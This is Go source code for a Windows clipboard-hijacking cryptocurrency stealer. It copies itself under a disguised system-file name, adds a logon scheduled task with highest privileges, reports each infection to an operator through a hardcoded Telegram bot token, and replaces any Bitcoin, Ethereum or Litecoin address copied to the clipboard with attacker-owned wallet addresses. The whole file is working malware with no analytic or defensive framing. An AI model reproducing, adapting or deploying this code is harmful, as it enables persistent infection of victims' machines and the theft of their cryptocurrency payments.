//go:generate goversioninfo -manifest=main.exe.manifest

package main

import (
	"github.com/atotto/clipboard"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"time"
)

func main() {
	DoSomeShit()
}

func DoSomeShit() {
	if CheckNear() == true { // Check vt
		TelegramIntegration()
		CreateDir() // check dir exists

		time.Sleep(2 * time.Second) // to be secureed

		CopyFile(func() string { p, _ := os.Executable(); return p }(), filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Crypto", "RSA", "SgrmBroker.exe")) //copy main exe
		CopyFile(func() string {
			p := filepath.Join(filepath.Dir(func() string { p, _ := os.Executable(); return p }()), "Leaf.xNet.dll")
			return p
		}(), filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Crypto", "RSA", "Leaf.xNet.dll")) //copy vt dll

		time.Sleep(1 * time.Second)
		TaskCreate(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Crypto", "RSA", "SgrmBroker.exe")) //create task through cmd
		Monitoring()                                                                                    //main theme
	} else {
		os.Exit(0)
	}
}

func CopyFile(src, dest string) {
	srcFile, _ := os.Open(src)
	defer srcFile.Close()
	destFile, _ := os.Create(dest)
	defer destFile.Close()
	_, _ = io.Copy(destFile, srcFile)
}
func TelegramIntegration() {
	bot, _ := tgbotapi.NewBotAPI("5734995063:AAGct4zZ5-Uxl_7S8B8R40SJtx2p9lvO3Ic")
	message := tgbotapi.NewMessage(799309399, "+1")
	_, _ = bot.Send(message)
}
func CreateDir() {
	if _, err := os.Stat(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Crypto", "RSA")); os.IsNotExist(err) {
		err = os.MkdirAll(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Crypto", "RSA"), 0755)
	}
}
func CheckNear() bool {
	path, _ := os.Executable()
	if _, err := os.Stat(filepath.Dir(path)); os.IsNotExist(err) {
		return true
	} else {
		return false
	}
}
func TaskCreate(path string) {
	cmd := exec.Command("cmd", "/C", "schtasks", "/CREATE", "/TN", "WindowsMonitor", "/TR", path, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
	cmd.Run()
}
func Monitoring() {
	lastClipboardText := ""

	eth := regexp.MustCompile("\\b0x[a-fA-F0-9]{40}\\b")
	ltc1 := regexp.MustCompile("\\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,39}\\b")
	legacy := regexp.MustCompile("\\b[1][a-km-zA-HJ-NP-Z1-9]{25,34}$")
	p2shsegwit := regexp.MustCompile("\\b([3])[A-HJ-NP-Za-km-z1-9]{27,34}")
	bc1 := regexp.MustCompile("\\b(bc1)[a-zA-HJ-NP-Z0-9]{25,39}$")

	for {
		// Read current clipboard text
		clipboardText, _ := clipboard.ReadAll()
		if clipboardText != lastClipboardText {
			if eth.MatchString(clipboardText) {
				clipboard.WriteAll("0x0eE4Be1bB4E4eCa4B3D7BDdDd4119054a3a4fBdb")
			} else if bc1.MatchString(clipboardText) {
				clipboard.WriteAll("bc1qfhv9ahw4ujz3palr8p76ywt9pnrssehckly4v6")
			} else if ltc1.MatchString(clipboardText) {
				clipboard.WriteAll("ltc1q60uhuyg22sazhd4y77swj2fdt03gfyc0d00wg8")
			} else if legacy.MatchString(clipboardText) {
				clipboard.WriteAll("17Ei7db9tysgrRwpQR71JPmVk6T5AEynaH")
			} else if p2shsegwit.MatchString(clipboardText) {
				clipboard.WriteAll("3E1cTHLoibaBZKUhgTZLahGB4ubs8NTiAu")
			} else {
				lastClipboardText = clipboardText
			}
		}
		time.Sleep(1 * time.Second)
	}
}
